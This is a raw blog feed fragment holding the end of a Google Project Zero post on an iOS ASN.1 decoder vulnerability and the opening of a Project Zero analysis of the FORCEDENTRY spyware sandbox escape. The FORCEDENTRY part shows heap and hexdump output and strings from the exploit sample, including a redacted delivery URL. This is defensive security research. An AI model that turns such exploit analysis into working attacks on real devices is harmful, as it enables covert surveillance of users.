&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;if&lt;/span&gt;&lt;span class="c1 c12"&gt;(&lt;/span&gt;&lt;span class="c3 c12"&gt;state&lt;/span&gt;&lt;span class="c1 c12"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c12"&gt;contents_length &lt;/span&gt;&lt;span class="c1 c12"&gt;==&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;)&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23 c12"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;return&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c12"&gt;1&lt;/span&gt;&lt;span class="c1 c12"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c12"&gt;else&lt;/span&gt;&lt;span class="c3 c12"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c12"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3 c12"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c12"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c32 c8 c15" id="h.kac2os93mix4"&gt;&lt;span class="c31 c28"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Forking complicated code is complicated. In this case it took almost two decades to in the end just revert a change made during import. Even verifying whether this revert is correct is really hard.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;The Mozilla and Apple codebases have continued to diverge since 2003. As I discovered slightly too late to be useful, the Mozilla code now has more comments trying to explain the decoder&amp;#39;s &amp;quot;novel&amp;quot; memory safety approach.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;Rewriting this code to be more understandable (and maybe even memory safe) is also distinctly non-trivial. The code doesn&amp;#39;t just implement ASN.1 decoding; it also has to support safely decoding incorrectly encoded data, as described by this verbatim comment for example:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * Okay, this is a hack. &amp;nbsp;It *should* be an error whether&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * pending is too big or too small, but it turns out that&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * we had a bug in our *old* DER encoder that ended up&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * counting an explicit header twice in the case where&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * the underlying type was an ANY. &amp;nbsp;So, because we cannot&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * prevent receiving these (our own certificate server can&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * send them to us), we need to be lenient and accept them.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * To do so, we need to pretend as if we read all of the&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * bytes that the header said we would find, even though&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; * we actually came up short.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; */&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;Verifying that a rewritten, simpler decoder also handles every hard-coded edge case correctly probably leads to it not being so simple after all.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1033743652169779882/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html" title="CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrv4IkZXgNv7MttlFFE1Gyyr2MQx0T4gzNAybXi3vsMhwT30WK_KaX1pF2zQKPLBoSU5Dtz3tG3yxJqaaE13leIBcnAFOb_HE8FFdy5yMOvoP0a_cB-IDi__SaWH4xL0czURYqdLtxvcKVSAysO0s8lOLrKykDEKEv1Z9fr0wQ7SOCDBcr5pgC-OoHcw/s72-c/image2%20%281%29.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1353264177358891846</id>
    <published>2022-03-31T09:00:00.001-07:00</published>
    <updated>2022-04-12T10:47:17.676-07:00</updated>
    <title type="text">FORCEDENTRY: Sandbox Escape</title>
    <content type="html">&lt;style type="text/css"&gt;ol{margin:0;padding:0}table td,table th{padding:0}.YDzVciBUld-c8{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.YDzVciBUld-c16{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.YDzVciBUld-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.YDzVciBUld-c10{color:#434343;text-decoration:none;vertical-align:baseline;font-size:14pt;font-style:normal}.YDzVciBUld-c13{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:italic}.YDzVciBUld-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.YDzVciBUld-c2{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.YDzVciBUld-c6{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.YDzVciBUld-c17{background-color:#b6d7a8;font-family:"Courier New";font-weight:700}.YDzVciBUld-c15{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.YDzVciBUld-c3{font-weight:400;font-family:"Arial"}.YDzVciBUld-c0{font-weight:400;font-family:"Courier New"}.YDzVciBUld-c11{color:inherit;text-decoration:inherit}.YDzVciBUld-c14{font-style:italic}.YDzVciBUld-c12{text-indent:36pt}.YDzVciBUld-c5{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="YDzVciBUld-c15"&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Posted by Ian Beer &amp;amp; &lt;/span&gt;&lt;span&gt;Samuel Gro&amp;szlig;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;of Google Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c13 YDzVciBUld-c3"&gt;We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&amp;rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely Project Zero&amp;rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Late last year &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;we published a writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit attributed by Citizen Lab to NSO.&lt;/span&gt;&lt;span&gt;&amp;nbsp;By sending a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;iMessage attachment (which was really a PDF) NSO were able to remotely trigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://en.wikipedia.org/wiki/Weird_machine"&gt;weird machine&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;capable of loading the next stage in the infection process: the sandbox escape.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;In this post we&amp;#39;ll take a look at that sandbox escape. It&amp;#39;s notable for using only logic bugs. In fact it&amp;#39;s unclear where the features that it uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer Authentication and Memory Tagging have no impact at all on this sandbox escape.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.80ze3m83kn16"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;An observation&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;During our initial analysis of the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;file Samuel noticed that rendering the image appeared to leak memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Running the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;heap&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;tool after releasing all the associated resources gave the following output:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;$ heap $pid&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;------------------------------------------------------------&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;All zones: 4631 nodes (826336 bytes) &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp;COUNT &amp;nbsp; &amp;nbsp;BYTES &amp;nbsp; &amp;nbsp; AVG &amp;nbsp; CLASS_NAME &amp;nbsp; TYPE &amp;nbsp; BINARY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp;===== &amp;nbsp; &amp;nbsp;===== &amp;nbsp; &amp;nbsp; === &amp;nbsp; ========== &amp;nbsp; ==== &amp;nbsp; ====== &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; 1969 &amp;nbsp; 469120 &amp;nbsp; 238.3 &amp;nbsp; non-object &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;825 &amp;nbsp; &amp;nbsp;26400 &amp;nbsp; &amp;nbsp;32.0 &amp;nbsp; JBIG2Bitmap &amp;nbsp;C++ &amp;nbsp; CoreGraphics&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;heap&lt;/span&gt;&lt;span&gt;&amp;nbsp;was able to determine that the leaked memory contained &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;objects.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Using the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;-address&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;option we could find all the individual leaked bitmap objects:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;$ heap -address JBIG2Bitmap $pid&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;and dump them out to files. &lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;One of those objects was quite unlike the others:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;$ hexdump -C dumpXX.bin | head&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000000 &amp;nbsp;62 70 6c 69 73 74 30 30 &amp;nbsp;|bplist00|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000018 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;24 76 65 72 73 69 &amp;nbsp;| &amp;nbsp;$versi|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000020 &amp;nbsp;6f 6e 59 24 61 72 63 68 &amp;nbsp;|onY$arch|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000028 &amp;nbsp;69 76 65 72 58 24 6f 62 &amp;nbsp;|iverX$ob|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000030 &amp;nbsp;6a 65 63 74 73 54 24 74 &amp;nbsp;|jectsT$t|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000038 &amp;nbsp;6f 70 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;|op &amp;nbsp; &amp;nbsp; &amp;nbsp;|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000040 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;4e 53 4b 65 79 65 &amp;nbsp;| &amp;nbsp;NSKeye|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;00000048 &amp;nbsp;64 41 72 63 68 69 76 65 &amp;nbsp;|dArchive|&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;It&amp;#39;s clearly a serialized &lt;/span&gt;&lt;span class="YDzVciBUld-c6 YDzVciBUld-c0"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc"&gt;NSKeyedArchiver&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Definitely not what you&amp;#39;d expect to see in a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;object. Running &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;strings&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;we see plenty of interesting things (noting that the URL below is redacted):&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;Objective-C class and selector names:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSConstantValueExpression&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSConstantValue&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;expressionValueWithObject:context:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;filteredArrayUsingPredicate:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;_web_removeFileOnlyAtPath:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;context:evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;performSelectorOnMainThread:withObject:waitUntilDone:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;The name of the file which delivered the exploit:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;XXX.gif&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;Filesystems paths:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;/tmp/com.apple.messages&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;a URL:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4 YDzVciBUld-c5"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Using &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;plutil&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can convert the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;bplist00&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary format to XML. Performing some post-processing and cleanup we can see that the top-level object in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSKeyedArchiver&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a serialized &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;object.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.1ai2h2r4yshv"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;NSExpression NSPredicate NSExpression&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;If you&amp;#39;ve ever used Core Data or tried to filter a Objective-C collection you might have come across &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" 